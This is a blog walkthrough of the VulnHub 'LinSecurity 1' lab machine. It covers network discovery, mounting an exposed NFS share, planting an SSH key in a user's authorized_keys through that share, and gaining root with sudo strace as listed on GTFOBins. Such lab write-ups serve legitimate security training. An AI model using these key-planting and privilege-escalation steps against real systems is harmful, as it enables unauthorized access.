<!-- wp:paragraph -->
<p>Download machine <a href="https://www.vulnhub.com/entry/linsecurity-1,244/" data-type="URL" data-id="https://www.vulnhub.com/entry/linsecurity-1,244/" target="_blank" rel="noreferrer noopener">here</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let's discover the machine IP with netdiscover.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":651,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/03/image-9.png?w=598" alt="" class="wp-image-651"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Use nmap to scan for open ports.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":653,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/03/image-10.png?w=608" alt="" class="wp-image-653"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Port 2049 NFS is open, let's mount it.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Create a new directory and use the mount command</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":667,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/03/image-17.png?w=265" alt="" class="wp-image-667"/><figcaption>We can export folders belonging to peter</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":655,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/03/image-11.png?w=597" alt="" class="wp-image-655"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>There are no interesting files.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":657,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/03/image-12.png?w=591" alt="" class="wp-image-657"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Lets create a local ssh key on our machine. </p>
<!-- /wp:paragraph -->

<!-- wp:syntaxhighlighter/code {"language":"bash"} -->
<pre class="wp-block-syntaxhighlighter-code">sudo su 
cd  /root/.ssh
ssh-keygen -t rsa

#copy the rsa file to the tmp folder
cp id_rsa.pub /tmp</pre>
<!-- /wp:syntaxhighlighter/code -->

<!-- wp:syntaxhighlighter/code {"language":"bash"} -->
<pre class="wp-block-syntaxhighlighter-code">#Change the owner of the file 
chown peter:peter /tmp/id_rsa.pub 

#Switch to peter 
su peter

#Copy the file into the mounted .ssh folder
cp /tmp/id_rsa.pub authorized_keys</pre>
<!-- /wp:syntaxhighlighter/code -->

<!-- wp:paragraph -->
<p>Switch to root user and login via ssh</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":660,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/03/image-13.png?w=768" alt="" class="wp-image-660"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>sudo -l </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":661,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/03/image-14.png?w=797" alt="" class="wp-image-661"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We can run <code>/usr/bin/strace</code> as root.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Head to GTFOBins <a href="https://gtfobins.github.io/gtfobins/strace/" data-type="URL" data-id="https://gtfobins.github.io/gtfobins/strace/" target="_blank" rel="noreferrer noopener">https://gtfobins.github.io/gtfobins/strace/</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":664,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/03/image-15.png?w=850" alt="" class="wp-image-664"/><figcaption>Shell exploit</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":665,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/03/image-16.png?w=463" alt="" class="wp-image-665"/><figcaption>Root gained!</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
